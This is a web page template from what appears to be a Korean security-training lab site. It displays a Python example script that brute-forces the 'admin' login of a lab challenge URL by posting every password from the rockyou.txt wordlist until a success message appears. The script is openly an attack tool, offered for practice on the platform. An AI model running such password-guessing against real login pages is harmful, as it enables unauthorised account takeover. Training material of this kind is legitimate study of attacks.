<head>
    <title>
        Code
    </title>
</head>
<body>
<?php
require_once (__DIR__ . '/../../../User/views/nav.php');
?>
<section class="align-items-center py-5">

    <main class="container">
        <div class="align-content-center">

            <div class=" py-1"></div>
            <div class="hstack gap-3">
                <div class="d-flex justify-content-between w-100 align-items-center">
                </div>
            </div>
            <div class="py-1"></div>
            <div class="table-group-divider py-1"></div>
            <div class="hstack gap-1">
                <div class="d-flex justify-content-between w-100 align-items-center">
                    <a class="fw-lighter fs-6 mb-0 nav-link">파이썬 코드 예시</a>
                    <div class="hstack gap-1">
                        <p class="fw-light fs-6 mb-0"></p>
                        <div class="vr"></div>
                        <p  class="fw-light fs-6 mb-0"></p>
                    </div>
                </div>
            </div>
            <div class="py-1"></div>
            <div class="table-group-divider py-3" style="border-color:gray;border-width: thin "></div>
            <p>import requests<br>
                #세션값 입력<br>
                session_value = "o1k9l5siaqin8n2innc6c877ua"<br>
                url = "http://192.0.0.2:8082/index.php?controller="+session_value+"&action=problem&type=lfi&difficulty=easy"<br>

                success_keyword = "로그인 성공"<br>

                username = "admin"<br>
                password_file = "/Users/moonseoungmin/Projects/Python/rockyou.txt"  # rockyou.txt 파일 경로<br>


                try:<br>
                with open(password_file, "r", encoding="latin-1") as file:<br>
                print("[*] Starting Brute Force Attack...")<br>
                <br>
                for password in file:<br>
                password = password.strip()<br>

                <br>
                data = {<br>
                "username": username,<br>
                "password": password<br>
                }<br>

                <br>
                response = requests.post(url, data=data)<br>
                <br>
                if success_keyword in response.text:<br>
                print(f"[+] Login Successful! Username: {username}, Password: {password}")<br>
                break<br>
                else:<br>
                print(f"[-] Failed Login for: {password}")<br>
                except FileNotFoundError:<br>
                print("[!] Password file not found. Please check the file path.")<br>
                except Exception as e:<br>
                print(f"[!] An error occurred: {e}")<br>
            </p>


        </div>

    </main>

</section>

</body>
